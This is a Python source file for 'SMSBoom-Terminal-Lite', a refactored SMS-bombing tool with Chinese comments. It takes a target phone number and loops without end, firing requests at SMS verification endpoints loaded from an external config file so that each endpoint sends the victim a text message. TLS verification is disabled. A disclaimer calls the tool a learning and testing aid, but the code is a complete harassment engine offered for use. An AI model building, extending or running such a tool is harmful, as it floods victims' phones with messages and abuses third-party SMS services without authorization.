"""
SMSBoom-Terminal-Lite 重构版 - 抽象化设计
采用面向对象和配置驱动的设计模式
"""

import requests
import time
import random
import sys
import os
import json
from colorama import init, Fore, Style
from urllib.parse import quote
import urllib3
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum
import logging

# 初始化
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置日志 - 只写入文件,不输出到控制台(避免干扰进度条)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('smsboom.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)


class RequestMethod(Enum):
    """HTTP请求方法枚举"""
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"


class ContentType(Enum):
    """内容类型枚举"""
    JSON = "application/json"
    FORM = "application/x-www-form-urlencoded"
    TEXT = "text/plain"


@dataclass
class SMSInterface:
    """短信接口配置类"""
    name: str                          # 接口名称
    url: str                          # 请求URL
    method: RequestMethod = RequestMethod.POST  # 请求方法
    headers: Dict[str, str] = field(default_factory=dict)  # 请求头
    params: Dict[str, str] = field(default_factory=dict)   # URL参数
    data_template: Optional[str] = None  # 数据模板（支持{phone}占位符）
    content_type: ContentType = ContentType.JSON  # 内容类型
    timeout: int = 5                  # 超时时间
    enabled: bool = True              # 是否启用
    weight: int = 1                   # 权重（调用次数）
    
    def build_request(self, phone: str) -> Dict:
        """构建请求参数"""
        # 安全地格式化URL,处理可能包含的JSON花括号
        try:
            url = self.url.format(phone=phone) if '{phone}' in self.url else self.url
        except (KeyError, ValueError):
            # 如果格式化失败,尝试转义其他花括号
            url = self.url.replace('{{', '{{{{').replace('}}', '}}}}').format(phone=phone) if '{phone}' in self.url else self.url
        
        request_config = {
            'url': url,
            'headers': self.headers.copy(),
            'timeout': self.timeout,
            'verify': False
        }
        
        # 处理URL参数
        if self.params:
            try:
                request_config['params'] = {
                    k: v.format(phone=phone) if isinstance(v, str) and '{phone}' in v else v
                    for k, v in self.params.items()
                }
            except (KeyError, ValueError):
                request_config['params'] = self.params.copy()
        
        # 处理请求体
        if self.data_template:
            try:
                # 先替换 phone 占位符,保留其他 JSON 结构
                data_str = self.data_template.replace('{phone}', phone)
                
                if self.content_type == ContentType.JSON:
                    try:
                        request_config['json'] = json.loads(data_str)
                    except json.JSONDecodeError:
                        request_config['data'] = data_str
                elif self.content_type == ContentType.FORM:
                    request_config['data'] = data_str
                else:
                    request_config['data'] = data_str
            except Exception as e:
                logger.debug(f"{self.name} 数据模板处理失败: {e}")
                request_config['data'] = self.data_template
        
        return request_config
    
    def send(self, phone: str) -> bool:
        """发送短信请求"""
        try:
            config = self.build_request(phone)
            method_func = getattr(requests, self.method.value.lower())
            response = method_func(**config)
            
            success = response.status_code in [200, 201, 204]
            logger.debug(f"{self.name}: {response.status_code}")
            return success
            
        except Exception as e:
            logger.error(f"{self.name} 失败: {str(e)}")
            return False


class InterfaceManager:
    """接口管理器 - 统一管理所有短信接口"""
    
    def __init__(self):
        self.interfaces: List[SMSInterface] = []
        self._load_interfaces()
    
    def _load_interfaces(self):
        """加载所有接口配置 - 完全从外部文件加载"""
        # 尝试从配置文件加载
        config_files = ['interfaces_complete.json']
        
        loaded = False
        for config_file in config_files:
            if os.path.exists(config_file):
                try:
                    self.load_from_config(config_file)
                    logger.info(f"✅ 从 {config_file} 加载了 {len(self.interfaces)} 个接口")
                    loaded = True
                    break
                except Exception as e:
                    logger.warning(f"⚠️  加载 {config_file} 失败: {e}")
        
        # 如果没有配置文件，使用默认的最小接口集（仅用于测试）
        if not loaded:
            logger.warning("⚠️  未找到配置文件，使用默认测试接口")
            self._load_default_interfaces()
    
    def _load_default_interfaces(self):
        """加载默认的最小接口集（仅用于测试）"""
        self.interfaces.extend([
            SMSInterface(
                name="测试接口1",
                url="https://httpbin.org/post",
                headers={"Content-Type": "application/json"},
                data_template='{"phone":"{phone}"}',
                enabled=False  # 默认禁用，需要用户配置真实接口
            )
        ])
    
    def get_enabled_interfaces(self) -> List[SMSInterface]:
        """获取所有启用的接口"""
        return [iface for iface in self.interfaces if iface.enabled]
    
    def get_weighted_tasks(self) -> List[SMSInterface]:
        """获取带权重的任务列表"""
        tasks = []
        for iface in self.get_enabled_interfaces():
            tasks.extend([iface] * iface.weight)
        return tasks
    
    def add_interface(self, interface: SMSInterface):
        """动态添加接口"""
        self.interfaces.append(interface)
        logger.info(f"添加接口: {interface.name}")
    
    def disable_interface(self, name: str):
        """禁用指定接口"""
        for iface in self.interfaces:
            if iface.name == name:
                iface.enabled = False
                logger.info(f"禁用接口: {name}")
                break
    
    def load_from_config(self, config_file: str):
        """从配置文件加载接口"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                config = json.load(f)
            
            for iface_config in config.get('interfaces', []):
                interface = SMSInterface(
                    name=iface_config['name'],
                    url=iface_config['url'],
                    method=RequestMethod(iface_config.get('method', 'POST')),
                    headers=iface_config.get('headers', {}),
                    params=iface_config.get('params', {}),
                    data_template=iface_config.get('data_template'),
                    content_type=ContentType(iface_config.get('content_type', 'application/json')),
                    timeout=iface_config.get('timeout', 5),
                    enabled=iface_config.get('enabled', True),
                    weight=iface_config.get('weight', 1)
                )
                self.interfaces.append(interface)
            
            logger.info(f"从配置文件加载了 {len(config['interfaces'])} 个接口")
        except Exception as e:
            logger.error(f"加载配置文件失败: {e}")


class ProgressTracker:
    """进度追踪器"""
    
    def __init__(self, total: int):
        self.total = total
        self.current = 0
        self.success = 0
        self.failed = 0
        self.progress_width = 30
    
    def update(self, success: bool):
        """更新进度"""
        self.current += 1
        if success:
            self.success += 1
        else:
            self.failed += 1
    
    def display(self):
        """显示进度条 - 原地更新不换行"""
        percent = int((self.current / self.total) * 100) if self.total > 0 else 0
        progress = int((self.current / self.total) * self.progress_width) if self.total > 0 else 0
        
        bar = f"{Fore.GREEN}{'█' * progress}{Fore.RED}{'░' * (self.progress_width - progress)}{Style.RESET_ALL}"
        
        # 使用 \r 回到行首，\033[K 清除到行尾的内容，避免残留字符
        sys.stdout.write(f"\r\033[K{Fore.CYAN}[{bar}] {percent}% | "
                        f"成功: {Fore.GREEN}{self.success}{Style.RESET_ALL} | "
                        f"失败: {Fore.RED}{self.failed}{Style.RESET_ALL} | "
                        f"任务: {self.current}/{self.total}")
        sys.stdout.flush()
    
    def reset(self):
        """重置进度"""
        self.current = 0
        self.success = 0
        self.failed = 0


class UIController:
    """用户界面控制器"""
    
    @staticmethod
    def print_logo():
        """打印Logo"""
        logo = f"""
{Fore.BLUE}+-----------------------------------+
{Fore.CYAN}|     SMSBoom Terminal Lite v2.0    |
{Fore.BLUE}+-----------------------------------+
{Fore.YELLOW}      抽象化重构版 - 更安全高效
{Style.RESET_ALL}
"""
        print(logo)
    
    @staticmethod
    def show_disclaimer():
        """显示免责声明"""
        text = (
            "⚠️  免责声明：本工具仅用于学习交流和安全测试\n"
            "请确保使用符合当地法律法规\n"
            "任何滥用行为导致的后果由使用者自行承担\n"
            "感谢上一个项目的作者：https://github.com/MallocPointer/SMSBoom-Terminal"
        )
        print(f"\n{Fore.RED}{Style.BRIGHT}{text}{Style.RESET_ALL}\n")
    
    @staticmethod
    def typewriter(text: str, color=Fore.WHITE, delay: float = 0.02):
        """打字机效果"""
        for char in text:
            sys.stdout.write(f"{color}{char}{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def clear_screen():
        """清屏"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def get_phone_input() -> Optional[str]:
        """获取手机号输入"""
        while True:
            phone = input(f"{Fore.CYAN}请输入目标手机号 (输入q退出): {Style.RESET_ALL}")
            
            if phone.lower() == 'q':
                return None
            
            if len(phone) == 11 and phone.isdigit():
                return phone
            
            print(f"{Fore.RED}✗ 请输入11位有效手机号{Style.RESET_ALL}")
    
    @staticmethod
    def confirm_action(target: str) -> bool:
        """确认操作"""
        confirm = input(f"{Fore.YELLOW}即将开始操作，目标: {target}\n确认执行？(y/n): {Style.RESET_ALL}")
        return confirm.lower() == 'y'


class SMSBoomEngine:
    """短信轰炸引擎 - 核心业务逻辑"""
    
    def __init__(self):
        self.interface_manager = InterfaceManager()
        self.ui = UIController()
        self.is_running = False
    
    def start(self):
        """启动程序"""
        try:
            self.ui.clear_screen()
            self.ui.print_logo()
            self.ui.show_disclaimer()
            
            # 获取手机号
            phone = self.ui.get_phone_input()
            if not phone:
                print(f"{Fore.YELLOW}程序已退出{Style.RESET_ALL}")
                return
            
            # 确认操作
            if not self.ui.confirm_action(phone):
                print(f"{Fore.RED}操作已取消{Style.RESET_ALL}")
                return
            
            # 开始执行
            self._execute_campaign(phone)
            
        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}⚠️  程序被用户中断{Style.RESET_ALL}")
        except Exception as e:
            logger.error(f"程序异常: {e}")
            print(f"{Fore.RED}✗ 程序错误: {str(e)}{Style.RESET_ALL}")
    
    def _execute_campaign(self, phone: str):
        """执行短信发送活动"""
        cycle_count = 1
        
        while True:
            self.ui.clear_screen()
            self.ui.print_logo()
            
            # 显示状态
            print(f"{Fore.CYAN}{'='*50}")
            print(f"{Fore.MAGENTA}📱 目标号码: {phone[:3]}****{phone[7:]}")
            print(f"{Fore.MAGENTA}🔄 循环次数: {cycle_count}")
            print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
            
            # 获取任务列表
            tasks = self.interface_manager.get_weighted_tasks()
            random.shuffle(tasks)
            
            # 创建进度追踪器
            tracker = ProgressTracker(len(tasks))
            
            start_time = time.time()
            
            # 执行任务
            for task in tasks:
                success = task.send(phone)
                tracker.update(success)
                tracker.display()
                
                # 小延迟避免过快请求
                time.sleep(0.05)
            
            # 本轮完成
            elapsed = time.time() - start_time
            print(f"\n\n{Fore.CYAN}✓ 本轮完成")
            print(f"{Fore.CYAN}⏱️  耗时: {Fore.YELLOW}{elapsed:.2f}秒")
            print(f"{Fore.CYAN}📊 成功率: {Fore.GREEN}{(tracker.success/tracker.total*100):.1f}%")
            print(f"{Fore.CYAN}即将开始下一轮...{Style.RESET_ALL}")
            
            # 倒计时
            for i in range(5, 0, -1):
                sys.stdout.write(f"\r{Fore.YELLOW}⏳ 等待: {i}秒{Style.RESET_ALL} ")
                sys.stdout.flush()
                time.sleep(1)
            
            cycle_count += 1
    
    def add_custom_interface(self, config: Dict):
        """添加自定义接口"""
        interface = SMSInterface(
            name=config['name'],
            url=config['url'],
            method=RequestMethod(config.get('method', 'POST')),
            headers=config.get('headers', {}),
            data_template=config.get('data_template'),
            timeout=config.get('timeout', 5)
        )
        self.interface_manager.add_interface(interface)


def main():
    """主函数"""
    engine = SMSBoomEngine()
    engine.start()


if __name__ == "__main__":
    main()
